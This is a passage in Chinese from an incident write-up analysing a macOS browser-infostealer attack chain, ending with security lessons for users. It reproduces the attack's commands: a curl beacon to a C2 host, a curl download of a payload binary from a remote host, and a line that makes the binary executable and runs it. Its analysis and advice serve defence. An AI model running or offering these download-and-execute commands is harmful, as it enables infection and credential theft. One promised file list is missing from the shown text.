## 二、攻击链技术分析

### 2.1 第一阶段：初始脚本

从 `meadow84.com` 下载的脚本（混淆后的 Zsh 脚本）做了三件事：

1. **向 C2 服务器报告感染成功**：
   ```
   curl POST https://pearl91.com/api/metrics/run?event=pasted
   ```

2. **下载核心恶意二进制文件**：
   ```
   curl -o /tmp/helper https://meadow84.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/code3/update
   ```

3. **赋予执行权限并运行**：
   ```
   xattr -c /tmp/helper && chmod +x /tmp/helper && /tmp/helper
   ```

### 2.2 第二阶段：核心 Payload（helper 二进制）

`/tmp/helper` 是一个 **Mach-O 通用二进制文件**（同时支持 x86_64 和 ARM64），大小约 2.6MB。其行为包括：

1. 创建临时工作目录 `/tmp/30665/` 和 `/tmp/39043/`（两次运行各一个）
2. 在临时目录中读取并拷贝以下文件
3. 打包为 `/tmp/out.zip` 准备外传

### 2.3 恶意文件清单

| 文件路径 | 作用 |
|---------|------|
| `/tmp/helper` | 核心恶意二进制 |
| `/tmp/out.zip` | 打包好的被盗数据 |
| `/tmp/30665/` | 第一次运行的工作目录 |

- **类型**：浏览器信息窃取器（Browser Infostealer）+ 文件抓取器

## 七、教训与建议

1. **永远不要执行 `curl ... | sh` / `curl ... | zsh` 这类命令**，除非你完整阅读并理解脚本内容
2. **Base64 编码的 URL 是恶意软件常用手法**，正常软件不会有意混淆下载地址
3. **下载软件只从官方渠道**：App Store、官网、Homebrew 等可信源
4. **Mac 登录密码不要和任何其他密码相同**，因为一旦泄露可能被用于解密本地数据
5. **定期检查「系统设置 → 通用 → 登录项」**，移除不认识的项目
6. **浏览器不要保存敏感网站密码**，或使用独立的密码管理器（如 1Password、Bitwarden）
7. **开启两步验证**：Google、Microsoft、GitHub、Apple ID 等核心账号
8. **考虑彻底重装系统**：鉴于攻击者获取了管理员密码，理论上可安装内核级 rootkit。本次未发现后门不代表完全无风险
